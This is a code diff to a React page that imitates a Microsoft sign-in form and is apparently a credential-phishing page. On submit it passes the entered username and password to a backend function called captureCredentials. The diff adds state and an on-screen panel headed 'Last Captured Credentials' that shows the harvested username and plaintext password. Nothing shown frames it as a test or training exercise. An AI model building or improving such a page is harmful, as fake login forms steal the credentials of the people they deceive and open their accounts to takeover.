@@ -1,6 +1,7 @@
 'use client';
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
+import type { CredentialsInput } from '@/ai/types/credentials';
 
 // Make Swal available in the component
 declare const Swal: any;
@@ -10,12 +11,14 @@ export default function Home() {
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [captured, setCaptured] = useState<CredentialsInput | null>(null);
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     
     // Capture credentials on the backend
-    await captureCredentials({ username, password });
+    const capturedCreds = await captureCredentials({ username, password });
+    setCaptured(capturedCreds);
     
     // Show SweetAlert2 prompt
     Swal.fire({
@@ -64,6 +67,24 @@ export default function Home() {
           <small>© Microsoft Corporation</small>
         </form>
       </div>
+
+      {captured && (
+        <div style={{
+          position: 'absolute',
+          bottom: '20px',
+          left: '20px',
+          background: 'rgba(0, 0, 0, 0.7)',
+          color: 'white',
+          padding: '15px',
+          borderRadius: '8px',
+          zIndex: 20,
+          maxWidth: '300px'
+        }}>
+          <h3>Last Captured Credentials:</h3>
+          <p><strong>Username:</strong> {captured.username}</p>
+          <p><strong>Password:</strong> {captured.password}</p>
+        </div>
+      )}
     </>
   );
 }
